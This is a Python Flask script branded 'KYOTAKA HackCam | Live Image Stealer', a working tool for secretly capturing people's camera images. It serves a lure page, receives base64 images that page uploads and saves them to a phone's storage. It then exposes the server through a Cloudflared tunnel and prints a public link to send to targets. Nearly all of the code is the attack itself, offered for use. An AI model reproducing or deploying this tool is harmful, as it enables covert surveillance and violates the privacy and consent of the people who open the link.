from flask import Flask, render_template, request
import os
import base64
import subprocess
import time
import re

app = Flask(__name__)

def kyotaka_banner():
    os.system('clear')
    print("\033[1;31m")
    print("═══════════════════════════════════════════════")
    print("█▀▀ █▄█ █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ █░░ █░░ █▄▀ ▄▀█")
    print("█▄▄ ░█░ █▄▀ ██▄ █▄█ █▄█ █▀█ █▄▄ █▄▄ █░█ █▀█")
    print("═══════════════════════════════════════════════")
    print("⚡ KYOTAKA HackCam | Live Image Stealer")
    print("🗂️ Dossier de capture : /sdcard/KYOTAKA_HackCam")
    print("🌐 En attente du lien Cloudflared...\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    path = '/sdcard/KYOTAKA_HackCam'
    os.makedirs(path, exist_ok=True)
    with open(f'{path}/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

def start_cloudflared(port):
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        while True:
            line = process.stdout.readline().decode()
            if "trycloudflare.com" in line:
                url_match = re.search(r'(https://.*\.trycloudflare\.com)', line)
                if url_match:
                    print(f"\033[1;32m🔗 Lien public : {url_match.group(1)}\033[0m\n")
                    break
            if line == '' and process.poll() is not None:
                break
    except:
        print("\033[1;31mErreur cloudflared\033[0m")

if __name__ == '__main__':
    kyotaka_banner()
    port = 5000
    time.sleep(1)
    start_cloudflared(port)
    app.run(port=port)